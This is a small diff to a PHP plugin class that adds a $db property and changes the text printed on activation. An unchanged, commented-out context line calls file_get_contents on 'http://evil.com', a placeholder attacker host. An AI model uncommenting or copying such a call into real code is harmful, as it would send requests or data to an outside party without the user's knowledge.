@@ -16,6 +16,7 @@ class Plugin extends Object implements PluginInterface
   public $host = '127.0.0.1';
   // protected $dsn = [];
   public $dsn;
+  public $db;
 
   // public function __construct(Component $connection, $config = [])
   // {
@@ -63,7 +64,7 @@ class Plugin extends Object implements PluginInterface
         // @file_get_contents("http://evil.com", false, $context);
         $this->createTable();
 
-        print_r($this->dsn."----Activated.\n\r");
+        print_r($this->db."----Activated.\n\r");
     }
     /**
      * @param string $type
